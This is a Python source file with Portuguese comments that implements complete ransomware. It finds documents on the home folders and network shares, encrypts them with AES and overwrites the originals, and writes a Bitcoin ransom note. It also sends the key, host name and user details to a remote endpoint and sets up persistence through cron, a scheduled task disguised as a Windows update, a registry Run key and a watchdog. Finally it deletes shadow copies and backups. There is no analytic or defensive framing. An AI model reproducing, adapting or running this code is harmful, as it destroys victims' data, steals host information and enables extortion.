import os
import sys
import pathlib
import secrets
import shutil
import hashlib
import itertools
import fnmatch
import base64
import json
import random
import socket
import threading
import time
import subprocess
import platform
import logging
import requests
from pathlib import Path
from typing import List, Tuple
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, hashes
from cryptography.hazmat.backends import default_backend
from cryptography.exceptions import InvalidKey, InvalidSignature

# ---------- Módulo 1: enumerar_arquivos ----------
def enumerar_arquivos() -> List[str]:
    base_dirs = [
        pathlib.Path.home() / "Documents",
        pathlib.Path.home() / "Desktop",
        pathlib.Path.home() / "Downloads",
        pathlib.Path.home() / "Pictures",
        pathlib.Path.home() / "Documentos_Teste",
    ]
    extensoes = {
        ".xlsx", ".docx", ".pdf", ".txt", ".csv",
        ".jpg", ".png", ".db", ".backup", ".psd",
        ".zip", ".rar"
    }
    def is_network_path(p: pathlib.Path) -> bool:
        s = str(p)
        return s.startswith(r"\\") or s.startswith("//")
    arquivos_encontrados = []
    for raiz in base_dirs:
        try:
            for dirpath, _, filenames in os.walk(raiz, topdown=True, onerror=lambda e: None):
                for nome in filenames:
                    ext = pathlib.Path(nome).suffix.lower()
                    if ext in extensoes:
                        arquivos_encontrados.append(os.path.abspath(os.path.join(dirpath, nome)))
        except Exception:
            continue
    possiveis_network = []
    for root in [pathlib.Path("/"), pathlib.Path(r"\\")]:
        try:
            for entry in root.iterdir():
                if is_network_path(entry):
                    possiveis_network.append(entry)
        except Exception:
            continue
    custom_network_paths = [
        pathlib.Path(r"\\server\share"),
        pathlib.Path("//server/share")
    ]
    possiveis_network.extend(custom_network_paths)
    for net_root in possiveis_network:
        if not net_root.exists():
            continue
        try:
            for dirpath, _, filenames in os.walk(net_root, topdown=True, onerror=lambda e: None):
                for nome in filenames:
                    ext = pathlib.Path(nome).suffix.lower()
                    if ext in extensoes:
                        arquivos_encontrados.append(os.path.abspath(os.path.join(dirpath, nome)))
        except Exception:
            continue
    vistos = set()
    resultado = []
    for caminho in arquivos_encontrados:
        if caminho not in vistos:
            vistos.add(caminho)
            resultado.append(caminho)
    return resultado

# ---------- Módulo 2: criptografar_e_substituir ----------
def _generate_key_iv() -> Tuple[bytes, bytes]:
    key = secrets.token_bytes(32)
    iv = secrets.token_bytes(16)
    return key, iv

def _encrypt_data(key: bytes, iv: bytes, data: bytes) -> bytes:
    padder = padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(padded) + encryptor.finalize()

def _secure_overwrite(path: pathlib.Path, passes: int = 3) -> None:
    length = path.stat().st_size
    with open(path, "r+b") as f:
        for _ in range(passes):
            f.seek(0)
            f.write(secrets.token_bytes(length))
            f.flush()
            os.fsync(f.fileno())
    os.sync()

def criptografar_e_substituir(caminho_arquivo: str) -> Tuple[bytes, bytes]:
    src_path = pathlib.Path(caminho_arquivo)
    if not src_path.is_file():
        raise FileNotFoundError(f"Arquivo não encontrado: {caminho_arquivo}")
    with open(src_path, "rb") as f:
        plaintext = f.read()
    key, iv = _generate_key_iv()
    ciphertext = _encrypt_data(key, iv, plaintext)
    out_path = src_path.with_suffix(".WNCRY")
    header = key + iv
    with open(out_path, "wb") as f:
        f.write(header)
        f.write(ciphertext)
    attempts = 0
    max_attempts = 5
    while attempts < max_attempts:
        try:
            _secure_overwrite(src_path, passes=3)
            src_path.unlink()
            break
        except Exception:
            attempts += 1
            if attempts >= max_attempts:
                raise OSError(f"Não foi possível remover o arquivo após {max_attempts} tentativas.")
    return key, iv

# ---------- Módulo 3: gerar_relatorio_ransom ----------
def gerar_relatorio_ransom(diretorio_raiz: str, extensao_criptografada: str = ".encrypted") -> None:
    for raiz, _, arquivos in os.walk(diretorio_raiz):
        arquivos_crypt = [f for f in arquivos if f.lower().endswith(extensao_criptografada)]
        if not arquivos_crypt:
            continue
        caminho_leia_me = os.path.join(raiz, "#_LEIA_ME_WNCRY_#.txt")
        if os.path.exists(caminho_leia_me):
            continue
        mensagem = (
            "ATENÇÃO!\n\n"
            "Todos os arquivos deste diretório foram criptografados.\n"
            f"Número de arquivos afetados: {len(arquivos_crypt)}\n\n"
            "Para recuperar seus dados, entre em contato através do e‑mail "
            "ransom@example.com ou efetue o pagamento de 0.5 BTC para o endereço "
            "1A2b3C4d5E6f7G8h9I0jKlMnOpQrStUvWx.\n\n"
            "Após a confirmação do pagamento, as chaves de descriptografia serão "
            "fornecidas. Não tente modificar ou remover os arquivos, pois isso "
            "pode torná‑los irrecuperáveis.\n\n"
            "— Equipe de Resgate"
        )
        try:
            with open(caminho_leia_me, "w", encoding="utf-8") as f:
                f.write(mensagem)
        except OSError as e:
            print(f"Erro ao criar arquivo de resgate em '{raiz}': {e}")

# ---------- Módulo 4: exfiltracao_chave ----------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Dalvik/2.1.0 (Linux; U; Android 10; Pixel 3 Build/QQ3A.200805.001)",
    "curl/7.68.0",
    "Wget/1.20.3 (linux-gnu)",
]

def _random_user_agent() -> str:
    return random.choice(USER_AGENTS)

def _get_host_name() -> str:
    return socket.gethostname()

def _get_internal_ip() -> str:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"

def _get_current_user() -> str:
    return os.getlogin()

def _list_encrypted_files(limit: int = 10) -> List[str]:
    encrypted = []
    for path in Path.cwd().rglob("*"):
        if path.is_file() and path.suffix == ".encrypted":
            encrypted.append(str(path))
            if len(encrypted) >= limit:
                break
    return encrypted

def exfiltracao_chave(aes_key: bytes, iv: bytes) -> None:
    endpoint = "http://10.254.19.238:8080/exfiltrar"
    payload = {
        "aes_key_b64": base64.b64encode(aes_key).decode("utf-8"),
        "iv": base64.b64encode(iv).decode("utf-8"),
        "host_name": _get_host_name(),
        "internal_ip": _get_internal_ip(),
        "current_user": _get_current_user(),
        "encrypted_files": _list_encrypted_files(),
    }
    def _send():
        headers = {"User-Agent": _random_user_agent(), "Content-Type": "application/json"}
        try:
            response = requests.post(endpoint, json=payload, headers=headers, timeout=10)
            response.raise_for_status()
        except Exception as e:
            print(f"[exfiltracao_chave] Failed to exfiltrate data: {e}. Retrying in 5 minutes.")
            timer = threading.Timer(5 * 60, _send)
            timer.daemon = True
            timer.start()
        else:
            print("[exfiltracao_chave] Exfiltration successful.")
    _send()

# ---------- Módulo 5: registrar_persistencia ----------
def _add_linux_cron(script_path: str) -> None:
    try:
        result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
        existing = result.stdout if result.returncode == 0 else ""
        reboot_entry = f"@reboot {sys.executable} {script_path}"
        minutes_entry = f"*/15 * * * * {sys.executable} {script_path}"
        lines = [line for line in existing.splitlines() if line.strip() and line not in (reboot_entry, minutes_entry)]
        lines.append(reboot_entry)
        lines.append(minutes_entry)
        new_crontab = "\n".join(lines) + "\n"
        subprocess.run(["crontab", "-"], input=new_crontab, text=True, check=True)
    except Exception as e:
        raise RuntimeError(f"Failed to set Linux cron persistence: {e}") from e

def _add_windows_task(script_path: str) -> None:
    try:
        task_name = "WindowsUpdateTask"
        cmd = [
            "schtasks",
            "/Create",
            "/TN", task_name,
            "/TR", f'"{sys.executable}" "{script_path}"',
            "/SC", "MINUTE",
            "/MO", "15",
            "/RL", "HIGHEST",
            "/RU", "SYSTEM",
            "/F"
        ]
        subprocess.run(" ".join(cmd), shell=True, check=True)
        cmd_reboot = [
            "schtasks",
            "/Create",
            "/TN", task_name + "_Boot",
            "/TR", f'"{sys.executable}" "{script_path}"',
            "/SC", "ONSTART",
            "/RL", "HIGHEST",
            "/RU", "SYSTEM",
            "/F"
        ]
        subprocess.run(" ".join(cmd_reboot), shell=True, check=True)
    except Exception as e:
        raise RuntimeError(f"Failed to create Windows scheduled task: {e}") from e

def _add_windows_registry(script_path: str) -> None:
    try:
        import winreg
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "WinUpdate", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
    except Exception as e:
        raise RuntimeError(f"Failed to write Run registry key: {e}") from e

def _watchdog_thread(binary_path: str, restore_cmd: list) -> None:
    while True:
        try:
            if not Path(binary_path).exists():
                subprocess.run(restore_cmd, check=True)
        except Exception:
            pass
        time.sleep(10)

def _start_windows_watchdog(script_path: str) -> None:
    try:
        backup_dir = Path(os.getenv("APPDATA")) / ".syscache"
        backup_dir.mkdir(parents=True, exist_ok=True)
        backup_path = backup_dir / Path(script_path).name
        if not backup_path.exists():
            subprocess.run([sys.executable, "-c", f"import shutil; shutil.copyfile(r'{script_path}', r'{backup_path}')"], check=True)
        restore_cmd = [sys.executable, "-c", f"import shutil; shutil.copyfile(r'{backup_path}', r'{script_path}')"]
        t = threading.Thread(target=_watchdog_thread, args=(script_path, restore_cmd), daemon=True)
        t.start()
    except Exception as e:
        raise RuntimeError(f"Failed to start Windows watchdog: {e}") from e

def registrar_persistencia(script_path: str = None) -> None:
    if script_path is None:
        script_path = os.path.abspath(sys.argv[0])
    current_os = platform.system()
    if current_os == "Linux":
        _add_linux_cron(script_path)
    elif current_os == "Windows":
        _add_windows_task(script_path)
        _add_windows_registry(script_path)
        _start_windows_watchdog(script_path)
    else:
        raise OSError(f"Unsupported operating system: {current_os}")

# ---------- Módulo 6: limpar_backups ----------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)

def _run_command(command: List[str]) -> None:
    try:
        result = subprocess.run(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
        )
        if result.stdout:
            logging.debug("Command output: %s", result.stdout.strip())
        if result.stderr:
            logging.debug("Command error output: %s", result.stderr.strip())
        if result.returncode != 0:
            logging.warning("Command %s exited with code %s", " ".join(command), result.returncode)
    except Exception as exc:
        logging.error("Failed to execute command %s: %s", " ".join(command), exc)

def _remove_paths(paths: List[Path]) -> None:
    for path in paths:
        try:
            if not path.exists():
                continue
            if path.is_dir():
                shutil.rmtree(path)
                logging.info("Removed directory: %s", path)
            else:
                path.unlink()
                logging.info("Removed file: %s", path)
        except Exception as exc:
            logging.error("Could not remove %s: %s", path, exc)

def limpar_backups() -> None:
    platform_str = sys.platform
    logging.info("Starting backup cleanup on platform: %s", platform_str)
    if platform_str.startswith("win"):
        _run_command(["vssadmin", "delete", "shadows", "/all", "/quiet"])
        logging.info("Executed VSS shadow deletion on Windows.")
    elif platform_str.startswith("linux"):
        timeshift_dirs = [Path("/timeshift"), Path("/run/timeshift/backup")]
        for base in timeshift_dirs:
            if base.is_dir():
                snapshots = [p for p in base.iterdir() if p.is_dir()]
                _remove_paths(snapshots)
        rsync_patterns = ["/var/backups/rsync*", "/home/*/rsync*", "/srv/rsync*"]
        rsync_paths = []
        for pattern in rsync_patterns:
            rsync_paths.extend([Path(p) for p in Path("/").glob(pattern)])
        _remove_paths(rsync_paths)
        exts = [".bak", ".old", ".backup"]
        files_to_remove = []
        for root, _, files in os.walk("/"):
            for name in files:
                if any(name.lower().endswith(ext) for ext in exts):
                    files_to_remove.append(Path(root) / name)
        _remove_paths(files_to_remove)
        logging.info("Linux backup cleanup completed.")
    else:
        logging.warning("Unsupported platform for backup cleanup: %s", platform_str)

# ---------- Execução principal ----------
if __name__ == "__main__":
    # 1. Enumerar arquivos alvo
    arquivos = enumerar_arquivos()
    print(f"Arquivos encontrados para criptografia: {len(arquivos)}")
    # 2. Criptografar cada arquivo e coletar última chave/iv para exfiltracao
    last_key = None
    last_iv = None
    for f in arquivos:
        try:
            k, iv = criptografar_e_substituir(f)
            last_key, last_iv = k, iv
        except Exception as e:
            print(f"Erro ao criptografar {f}: {e}")
    # 3. Gerar relatórios de ransom nos diretórios onde arquivos foram criptografados
    # assumindo que arquivos criptografados têm extensão .WNCRY
    gerar_relatorio_ransom(os.getcwd(), extensao_criptografada=".WNCRY")
    # 4. Exfiltrar chave se disponível
    if last_key and last_iv:
        exfiltracao_chave(last_key, last_iv)
    # 5. Configurar persistência
    registrar_persistencia()
    # 6. Limpar backups
    limpar_backups()
    print("Operação concluída.")